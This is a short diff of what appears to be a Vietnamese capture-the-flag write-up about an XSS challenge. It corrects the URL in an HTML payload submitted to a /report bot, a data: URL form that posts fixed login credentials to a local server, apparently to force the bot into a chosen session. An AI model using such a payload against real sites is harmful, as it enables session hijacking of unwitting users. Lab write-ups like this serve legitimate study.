@@ -91,7 +91,7 @@ Kịch bản mở tab Bot (pico), đổi session sang Hacker rồi chạy XSS đ
 ### Payload gửi trong /report
 ```html
 data:text/html,
-<form action="[http://0.0.0.0:8080/login](http://0.0.0.0:8080/login)" method="POST" id="login_form" target="_self">
+<form action="http://0.0.0.0:8080/login" method="POST" id="login_form" target="_self">
     <input type="text" name="username" value="ad">
     <input type="text" name="password" value="ad">
 </form>
